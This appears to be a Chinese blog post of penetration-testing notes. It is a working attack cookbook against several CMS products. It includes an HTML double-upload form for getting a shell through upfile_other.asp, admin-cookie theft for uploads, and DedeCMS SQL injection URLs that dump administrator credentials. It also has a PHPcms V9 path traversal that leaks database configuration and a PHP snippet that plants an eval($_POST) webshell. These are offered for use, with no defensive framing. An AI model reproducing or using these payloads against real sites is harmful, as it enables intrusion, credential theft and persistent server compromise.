+<p>（ 利用upfile_other.asp漏洞拿shell ）</p>
+<p>直接访问会员中心：userreg.asp</p>
+<p>注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer</p>
+<html><head> &lt;META http-equiv=Content-Type content=”text/html; charset=gb2312″&gt; &lt;STYLE type=text/css&gt;BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px } <br><br><meta content="”MSHTML" 6.00.2800.1400″="" name="GENERATOR"></head> <body leftmargin="0" topmargin="0"> &lt;FORM name=form1 action=”<a href="http://www.xxx.com/upfile_other.asp”" target="_blank" rel="noopener">http://www.xxx.com/upfile_other.asp”</a>; method=post encType=multipart/form-data&gt;<input type="file" size="30" name="FileName"> <input type="file" size="30" name="FileName1"> <input style="”BORDER-RIGHT:" rgb(88,88,88)="" 1px="" double;="" border-top:="" font-weight:="" normal;="" font-size:="" 9pt;="" border-left:="" line-height:="" border-bottom:="" font-style:="" font-variant:="" normal”="" type="submit" value="上传" name="Submit"> <input id="PhotoUrlID" type="hidden" value="0" name="PhotoUrlID"> </body></html>
+
+<p>另外可以利用会员中心的cookies，用火狐浏览器登陆之后，访问upfile_other.asp页面，用抓包工具去抓包，接着用明小子上传拿shell.</p>
+<p>（ 上传漏洞 ）</p>
+<p>漏洞文件：Upfile_Photo.asp</p>
+<p>前提是进入后台了，访问这个文件，将提示“请先选择你要上传的文件！”，用抓包工具抓管理员的cookies，再把上传地址跟cookies扔到名小子里上传拿shell</p>
+<p>（ 南方在线编辑器 ）</p>
+<p>默认后台：admin/Southidceditor/admin_style.asp</p>
+<p>数据库路径：admin/SouthidcEditor\Datas\SouthidcEditor.mdb</p>
+<p>遍历目录：admin/Southidceditor/admin_uploadfile.asp?id=14&amp;dir=../..</p>
+<p>文件上传页面：admin/Southidceditor/ewebeditor.asp?id=57&amp;style=southidc</p>
+<p>样式设置页面：admin/SouthidcEditor/Admin_Style.asp?action=styleset&amp;id=47</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>dedecms最新注入漏洞及找后台技巧 :</p>
+<p>访问这个：plus/search.php?keyword=as&amp;typeArr[ uNion ]=a</p>
+<p>看结果如果提示：Safe Alert: Request Error step 1 !那么直接用下面的exp爆出所有管理员的帐号密码：</p>
+<p>plus/search.php?keyword=as&amp;typeArr[111%3D@\’)+and+(SELECT+1+FROM+(select+count(<em>),concat(floor(rand(0)</em>2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%23@__admin+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@\’+]=a</p>
+<p>看结果如果提示：Safe Alert: Request Error step 2 !</p>
+<p>那么直接用下面的exp爆出所有管理员的帐号密码</p>
+<p>plus/search.php?keyword=as&amp;typeArr[111%3D@\’)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%23@__admin%23@\’+]=a</p>
+<p>有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了</p>
+<p>破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可</p>
+<p>如何找后台？</p>
+<p>默认后台：dede</p>
+<p>第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）</p>
+<p>第二种方法：把域名作为后台去尝试</p>
+<p>第三种方法：查看这个文件：robots.txt</p>
+<p>第四种方法：ping下域名获得ip之后，<a href="http://www.bing.com/" target="_blank" rel="noopener">http://www.bing.com/</a> 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）</p>
+<p>—————————————————————————————————————————————————————-</p>
+<p>PHPcms V9 爆数据库信息漏洞:</p>
+<p>直接爆出数据库连接信息：/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php</p>
+<p>关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码</p>
+<p>&lt;?$fp = @fopen(“0day.php”, ‘a’);</p>
+<p>@fwrite($fp, ‘&lt;‘.’?php’.”\r\n\r\n”.’eval($_POST[0day])’.”\r\n\r\n?”.”&gt;\r\n”);<br>点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day</p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">GETAGGT IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/渗透/">渗透</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/coolfire黑客入门教程/" data-tooltip="coolfire黑客入门教程" aria-label="FRÜHER: coolfire黑客入门教程">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/手工注入/" data-tooltip="手工注入" aria-label="NÄCHSTER: 手工注入">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 Lao k17. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/coolfire黑客入门教程/" data-tooltip="coolfire黑客入门教程" aria-label="FRÜHER: coolfire黑客入门教程">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">FRÜHER</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/01/手工注入/" data-tooltip="手工注入" aria-label="NÄCHSTER: 手工注入">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NÄCHSTER</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Diesen Beitrag teilen">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Facebook">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Twitter">
+                    <i class="fa fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/01/渗透笔记/" title="Teilen auf Google Plus">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+    <i id="btn-close-shareoptions" class="fa fa-close"></i>
+    <ul class="share-options">
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://s-sec.github.io/2017/03/01/渗透笔记/">
+                    <i class="fa fa-facebook-official" aria-hidden="true"></i><span>Teilen auf Facebook</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://s-sec.github.io/2017/03/01/渗透笔记/">
+                    <i class="fa fa-twitter" aria-hidden="true"></i><span>Teilen auf Twitter</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://s-sec.github.io/2017/03/01/渗透笔记/">
+                    <i class="fa fa-google-plus" aria-hidden="true"></i><span>Teilen auf Google Plus</span>
+                </a>
+            </li>
+        
+    </ul>
+</div>
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <h4 id="about-card-name">Lao k17</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker"></i>
+                <br/>
+                China
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-xzfezjobyekpxrjktw5tz6muvzqfsbmo5n6atk3p5om9ulfptldi3p7cyqd8.min.js"></script>
+<!--SCRIPTS END-->
+
+    
+
+
+
+    </body>
+</html>
